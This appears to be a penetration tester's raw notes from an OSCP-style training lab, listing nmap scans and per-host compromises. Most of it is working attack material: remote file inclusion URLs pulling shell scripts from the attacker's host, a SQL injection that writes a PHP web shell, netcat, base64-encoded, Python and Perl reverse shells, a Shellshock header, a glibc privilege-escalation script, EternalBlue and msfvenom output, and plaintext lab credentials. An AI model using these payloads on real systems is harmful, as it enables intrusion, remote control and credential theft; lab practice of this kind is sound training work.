### 10.11.1.8

#### information

Not shown: 990 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.0.1
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.0.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.0.1 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)
|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)
|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)
|_sshv1: Server supports SSHv1
25/tcp   closed smtp
80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 2 disallowed entries
|_/internal/  /tmp/
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open   rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            844/udp  status
|_  100024  1            847/tcp  status
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
443/tcp  open   ssl/https?
|_ssl-date: 2019-03-01T08:39:29+00:00; -11s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)
631/tcp  open   ipp         CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
3306/tcp open   mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:50:56:89:24:79 (VMware)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 1h39m49s, deviation: 2h53m12s, median: -11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name:
|   Domain name:
|   FQDN: phoenix
|_  System time: 2019-03-01T03:39:28-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

###  exploit

https://www.exploit-db.com/exploits/9623

#### poc

http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.104/shell.txt%00&cmd=cat /etc/passwd

```shell
<pre>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nolo
```







### 10.11.1.13

####  information

#### exploit

ftp allow anonymous user to upload file in wwwroot path

ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
01-17-07  06:42PM       <DIR>          AdminScripts
01-17-07  06:43PM       <DIR>          ftproot
01-17-07  06:43PM       <DIR>          iissamples
01-17-07  06:43PM       <DIR>          Scripts
03-13-19  11:46AM       <DIR>          wwwroot

#### poc

msfveon -p windows/meterpreter/reverse_tcp  lhost=ip lport=port  -f asp -o sh.asp

### 10.11.1.22

Nmap scan report for 10.11.1.22
Host is up (0.29s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp?
22/tcp    open  ssh         OpenSSH 3.1p1 (protocol 1.99)
| ssh-hostkey:
|   1024 4a:e3:f8:07:d5:d6:b1:b5:bf:54:ac:e7:17:36:7e:e8 (RSA1)
|   1024 77:67:f2:2c:3d:7c:45:24:fe:5e:0f:de:07:65:b3:57 (DSA)
|_  1024 42:b1:48:0b:41:f8:a9:12:cc:9b:c4:ed:26:74:64:2c (RSA)
|_sshv1: Server supports SSHv1
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http        Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)
| http-methods:
|_  Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
443/tcp   open  ssl/https   Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: 400 Bad Request
|_ssl-date: 2019-03-13T13:30:48+00:00; -2s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
995/tcp   open  ssl/pop3s?
|_ssl-date: 2019-03-13T13:30:47+00:00; -3s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:50:56:89:2E:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### exploit

https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1

poc

https://www.exploit-db.com/raw/764

./openfuck 0x73 10.11.1.22 -c 40

we knew that some port open when we used the nmap scan,

 so we try to get the version about samba.

cat  /var/log/rpmpkgs | grep samba

samba-2.2.3a-6.i386.rpm
samba-client-2.2.3a-6.i386.rpm
samba-common-2.2.3a-6.i386.rpm

this is article : https://yanhan.github.io/netsec-blog/posts/kioptrix-level-1-walkthrough.html

Boom!

perl trans2root.pl   -t  linx86 -H 10.11.0.104 -h 10.11.1.22

we get the root shell

#### 10.11.1.24

csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd



#### 10.11.1.31

#### information

80/tcp   open  http          Microsoft IIS httpd 6.0
| http-cookie-flags:
|   /:
|     ASPSESSIONIDSCDQASQB:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Login
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2003 3790 Service Pack 1 microsoft-ds
1025/tcp open  msrpc         Microsoft Windows RPC
1033/tcp open  msrpc         Microsoft Windows RPC
1433/tcp open  ms-sql-s      Microsoft SQL Server 2000 8.00.766.00; SP3a
| ms-sql-ntlm-info:
|_  Product_Version: 5.2.3790
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: 00:50:56:89:1E:41 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
|_clock-skew: mean: 2h59m57s, deviation: 4h14m34s, median: -3s
| ms-sql-info:
|   Windows server name: RALPH
|   10.11.1.31\MSSQLSERVER:
|     Instance name: MSSQLSERVER
|     Version:
|       name: Microsoft SQL Server 2000 SP3a
|       number: 8.00.766.00
|       Product: Microsoft SQL Server 2000
|       Service pack level: SP3a
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.11.1.31\pipe\sql\query
|_    Clustered: false
|_nbstat: NetBIOS name: RALPH, NetBIOS user: USER65, NetBIOS MAC: 00:50:56:89:1e:41 (VMware)
| smb-os-discovery:
|   OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2)
|   OS CPE: cpe:/o:microsoft:windows_server_2003::sp1
|   Computer name: ralph
|   NetBIOS computer name: RALPH\x00
|   Workgroup: THINC\x00
|_  System time: 2019-03-14T21:05:44-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

#### recon

port smb, mssql , web

smb

smbmap -u anonymous -H 10.11.1.31 -R  -A  base-login.txt
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.11.1.31...
[+] IP: 10.11.1.31:445  Name: 10.11.1.31
        Disk                                                    Permissions

----                                                    -----------
​        C$                                                      NO ACCESS
​        IPC$                                                    NO ACCESS
​        ADMIN$                                                  NO ACCESS
​        [+] Match found! Downloading: wwwroot\.\base-login.txt

read the   login-off.asp.txt  by http://10.11.1.31/login-off.asp.txt

cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"

this have the mssql login info

#### sqsh

sqsh -S 10.11.1.31 -U sa 

passwd : poiuytrewq



 xp_cmdshell 'cmd /c dir c:\DOCUME~1\Administrator\desktop\proof.txt';

go

BOOM!



### 10.11.1.24

#### information



#### recon

GET /index.php?target=products&mode=search&subcats=Y&type=extended&avail=Y&pshort=Y&pfull=Y&pname=Y&q=asdf&cid=0&x=0&y=0 HTTP/1.1
Host: 10.11.1.24
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.24/
Cookie: csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd

csid have the sql injection, https://seclists.org/pen-test/2007/Dec/75

**Writing a phpshell via SQL Injection to a host**

csid=a8b144e2690690581ea858648a710cea'+union+select+"<%3fphp+echo+shell_exec($_REQUEST['cmd'])%3b%3f>+"+into+outfile+"/var/www/ell2.php"+/*++--+-; cart_languageC=EN

view-source:http://10.11.1.24/ell2.php?cmd=ls

```php
Thumbs.db
addons
admin.php
apache2-default
catalog
chart.php
classes
config.php
core
ell.php
ell.txt
ell2.php
image.php
images
include
index.php
init.php
install.php
install_db
payments
prepare.php
shell.php
shippings
skins
store_closed.gif
store_closed.html
targets
var
```

Boom!

#### reverse shell

nc -e /bin/sh 10.11.0.104 9000

#### enum the system

 msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=10.11.0.104 lport=8000 -f elf -o check

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.11.1.24 - Collecting local exploits for x86/linux...
[*] 10.11.1.24 - 25 exploit checks are being tried...
[+] 10.11.1.24 - exploit/linux/local/glibc_ld_audit_dso_loadP

[+] 10.11.1.24 - exploit/linux/local/glibc_origin_expansion_priv_esc: The target appears to be vulnerable.
[+] 10.11.1.24 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.
[*] Post module execution completed



msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set lhost 10.11.0.104
lhost => 10.11.0.104
msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > run

[*] Started reverse TCP handler on 10.11.0.104:4444
[+] The target appears to be vulnerable
[*] Using target: Linux x86
[*] Writing '/tmp/.QCt1Q64' (1271 bytes) ...
[*] Writing '/tmp/.BU8n4' (281 bytes) ...
[*] Writing '/tmp/.wiUsPR47P' (207 bytes) ...
[*] Launching exploit...
[*] Sending stage (985320 bytes) to 10.11.1.24
[*] Meterpreter session 2 opened (10.11.0.104:4444 -> 10.11.1.24:46457) at 2019-03-15 15:22:22 +0800

meterpreter > sessions -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sessions  -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=

Boom!

[*] Downloading: /root/capture.cap -> capture.cap
[*] Downloaded 2.24 KiB of 2.24 KiB (100.0%): /root/capture.cap -> capture.cap
[*] download   : /root/capture.cap -> capture.cap

we wanna see the capture.cap, this is something interersting

220-FileZilla Server version 0.9.34 beta

220-written by Tim Kosse (Tim.Kosse@gmx.de)

220 Please visit http://sourceforge.net/projects/filezilla/

10.11.1.220

USER brett

331 Password required for brett

PASS ilovesecuritytoo

230 Logged on

SYST

215 UNIX emulated by FileZilla

QUIT

221 Goodbye

####  10.11.1.31

sory I Forgot this how to get shell



## 10.11.1.35

#### information

#### recon

this is a LFI https://10.11.1.35/section.php?page=/etc/passwd%00 and RFI 

#### poc

https://10.11.1.35/section.php?page=http://10.11.0.104/cmd.txt%00&cmd=ls

'''

```
alldocs.php
bobdocs.php
files
frame_a.htm
frame_b.htm
frame_c.htm
index.html
section.php
```

'''

 privsec

https://www.exploit-db.com/exploits/28657

 glibc_origin_expansion_priv_esc  to be vulnerable.

https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2010/CVE-2010-3847.sh

```bash
root@ens:~/oscp/35/www# gcc -m32 -w -fPIC -shared -o lenis  a.c
root@ens:~/oscp/35/www# cat shell.sh
#!/bin/bash

mkdir /tmp/lenis
ln /bin/ping /tmp/lenis/target
exec 3< /tmp/lenis/target
rm -rf /tmp/lenis/
mv lenis.bak lenis
#rm -r a.c
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
```




```bash


bash-3.1$ bash shell.sh
bash-3.1# id
uid=0(root) gid=48(apache) groups=48(apache)
bash-3.1# cd /root
bash-3.1# cat proo*
3f7d652a3efb59d0631771f65c65ba07
```

# 10.11.1.39

10.11.1.39
User-Agent: goolgebot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

User-agent: *
Allow: /otrs/index.pl



# 10.11.1.44



# 10.11.1.49

# 10.11.1.71

http://10.11.1.71/cgi-bin/admin.cgi

```bash
Perl verion is 5.18.2
HTTP Server is Apache 2.4.7. Modules: 
Operating System is Ubuntu Linux 14.04 (kernel: 3.13.0-141-generic)
CPU: Intel(R) Xeon(R) CPU X5690  @ 3.47GHz
Statistics for CpuStats (all)
  user      0.00
  nice      0.00
  system    0.00
  idle      100.00
  ioWait    0.00
  total     0.00

Memory Usage: 674/737MB (91.45%)
Disk Usage: 2/4GB (47%)
CPU Load: 0.00

Current users:

Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       4.8G  2.1G  2.5G  47% /
none            4.0K     0  4.0K   0% /sys/fs/cgroup
udev            359M  4.0K  359M   1% /dev
tmpfs            74M  496K   74M   1% /run
none            5.0M     0  5.0M   0% /run/lock
none            369M     0  369M   0% /run/shm
none            100M     0  100M   0% /run/user
```

### payload 

User-Agent: () { :;};/usr/bin/which python;echo;

 gibson@nobrains.com | $P$BR2C9zC2Aau72.4cNZfJPC.iV8Ppj41 <Paste>

gibson@alpha:~$ sudo -l
[sudo] password for gibson:
Matching Defaults entries for gibson on alpha:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gibson may run the following commands on alpha:
    (ALL : ALL) ALL

root@alpha:/root# cat proo*
97f3446c2c2fc5079f22dc38f60c8a78



# 10.11.1.72

setpassword ryuu pass
Password for ryuu reset

telnet 10.11.1.72 110
Trying 10.11.1.72...
Connected to 10.11.1.72.
Escape character is '^]'.
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready
user ryuu
+OK
pass pass
+OK Welcome ryuu
list
+OK 2 1807
1 786
2 1021

retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <19262980.2.1420734423735.JavaMail.root@pop3>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ryuu@localhost
Received: from localhost ([127.0.0.1])
          by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 874
          for <ryuu@localhost>;
          Thu, 8 Jan 2015 11:27:01 -0500 (EST)
Date: Thu, 8 Jan 2015 11:27:01 -0500 (EST)
From: mailadmin@localhost
Dear Ryuu,

Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any command you need to your path.

username: ryuu
password: QUHqhUPRKXMo4m7k

rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1| nc 10.11.0.104 8000 > /tmp/f

echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjF8IG5jIDEwLjExLjAuMTA0IDgwMDAgPiAvdG1wL2YK" | base64 -d | /bin/sh

setpassword ../../../../../../../../etc/bash_completion.d
Usage: setpassword [username] [password]
setpassword ../../../../../../../../etc/bash_completion.d pass
Password for ../../../../../../../../etc/bash_completion.d reset

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.104",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
https://www.exploit-db.com/exploits/35161


cat proof.txt
7ccae11dc3ecb5f65e41b169b05f2c65
```

# 10.11.1.73

# 10.11.1.75

msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.11.1.75
rhosts => 10.11.1.75
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

Payload options (generic/shell_reverse_tcp):

[*] Started reverse TCP handler on 10.11.0.104:4444
[*] 10.11.1.75:445 - Connecting to target for exploitation.
[+] 10.11.1.75:445 - Connection established for exploitation.
[+] 10.11.1.75:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.11.1.75:445 - CORE raw buffer dump (42 bytes)
[*] 10.11.1.75:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.11.1.75:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.11.1.75:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.11.1.75:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.11.1.75:445 - Trying exploit with 12 Groom Allocations.
[*] 10.11.1.75:445 - Sending all but last fragment of exploit packet
[*] 10.11.1.75:445 - Starting non-paged pool grooming
[+] 10.11.1.75:445 - Sending SMBv2 buffers
[+] 10.11.1.75:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.11.1.75:445 - Sending final SMBv2 buffers.
[*] 10.11.1.75:445 - Sending last fragment of exploit packet!
[*] 10.11.1.75:445 - Receiving response from exploit packet
[+] 10.11.1.75:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.11.1.75:445 - Sending egg to corrupted connection.
[*] 10.11.1.75:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.11.0.104:4444 -> 10.11.1.75:49233) at 2019-04-04 15:37:32 +0800

 Directory of C:\Users\Administrator\Desktop

10/17/2018  05:13 AM    <DIR>          .
10/17/2018  05:13 AM    <DIR>          ..
10/17/2018  05:13 AM                32 proof.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,107,875,328 bytes free

C:\Users\Administrator\Desktop>type  proof.txt
type  proof.txt
1f88aa9e73f267356f033a42d9320b50
C:\Users\Administrator\Desktop>



# 10.11.1.115

# 10.11.1.116

url :http://10.11.1.116/db/phpliteadmin.php

lfi: http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../..//usr/local/databases/pass.php&cmd=ls

```bash
perl -e 'use Socket;$i="10.11.0.104";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

privilege poc

https://www.exploit-db.com/exploits/26368

$ gcc ptrace.c -o ptrace
ptrace.c:89:2: warning: no newline at end of file
$ ls
ptrace
ptrace.c
$ ./ptrace
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)

cat proof.txt
f96fa30b9bc142e9d5c3649b055c28de